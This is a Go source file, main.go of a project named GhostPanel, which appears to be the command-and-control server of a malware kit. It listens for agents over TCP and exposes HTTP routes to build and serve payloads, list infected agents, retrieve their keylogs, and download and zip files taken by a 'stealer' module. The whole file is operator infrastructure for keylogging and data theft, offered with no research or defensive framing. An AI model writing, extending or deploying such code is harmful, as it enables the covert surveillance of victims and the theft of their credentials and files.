package main

import (
	"fmt"
	"ghostpanel/handlers"
	"log"
	"net/http"

	"github.com/gorilla/mux"
)

func main() {
	// 1. Start TCP Listener for Agents
	go handlers.StartTCPServer("0.0.0.0:9000")

	// 2. Setup HTTP Router
	r := mux.NewRouter()

	// 3. Register Routes
	r.HandleFunc("/ws/{id}", handlers.WSHandler)
	r.HandleFunc("/api/build", handlers.BuildHandler).Methods("POST", "OPTIONS")
	r.HandleFunc("/api/agents", handlers.GetAgents).Methods("GET")
	r.HandleFunc("/api/agents/{id}/keylogs", handlers.GetKeylogs).Methods("GET")
	r.HandleFunc("/api/agents/{id}", handlers.DeleteAgent).Methods("DELETE", "OPTIONS")
	r.HandleFunc("/api/agents/{id}/stealer/files", handlers.GetStealerFiles).Methods("GET")
	r.HandleFunc("/api/agents/{id}/stealer/status", handlers.GetStealerStatus).Methods("GET")
	r.HandleFunc("/api/config", handlers.GetConfigHandler).Methods("GET")
	r.HandleFunc("/api/config", handlers.UpdateConfigHandler).Methods("POST", "OPTIONS")
	
	// Serve built payloads
	r.PathPrefix("/download/").Handler(http.StripPrefix("/download/", http.FileServer(http.Dir("../output"))))
	// Serve logs (keylogs, stealer data) - AUTH WARNING: In prod, protect this!
	r.PathPrefix("/logs/").Handler(http.StripPrefix("/logs/", http.FileServer(http.Dir("../logs"))))
	
	// Stealer Zip Download
	r.HandleFunc("/api/agents/{id}/stealer/zip", handlers.DownloadStealerZip).Methods("GET")

	// Global CORS Middleware
	r.Use(func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Access-Control-Allow-Origin", "*")
			w.Header().Set("Access-Control-Allow-Methods", "POST, GET, OPTIONS, PUT, DELETE")
			w.Header().Set("Access-Control-Allow-Headers", "Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization")
			
			if r.Method == "OPTIONS" {
				return
			}
			
			next.ServeHTTP(w, r)
		})
	})

	fmt.Println("GhostPanel Server running on :8888 (HTTP) and :9000 (TCP)")
	log.Fatal(http.ListenAndServe(":8888", r))
}
